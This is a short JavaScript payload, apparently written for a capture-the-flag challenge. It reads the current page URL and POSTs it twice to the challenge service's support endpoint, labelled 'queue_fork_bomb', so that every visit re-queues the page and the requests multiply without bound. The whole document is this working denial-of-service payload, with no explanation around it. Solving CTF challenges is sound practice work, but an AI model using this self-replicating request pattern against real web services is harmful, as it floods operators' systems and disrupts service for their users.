let bombUrl = window.location.href;

function do_recursive() {
	fetch("https://api.wimc.ctf.allesctf.net/1.0/support", {
		method: "POST",
		headers: {
			"Content-Type": "application/x-www-form-urlencoded"
		},
		body: `description=queue_fork_bomb&url=${encodeURIComponent(bombUrl)}`
	});
}

do_recursive();
do_recursive();
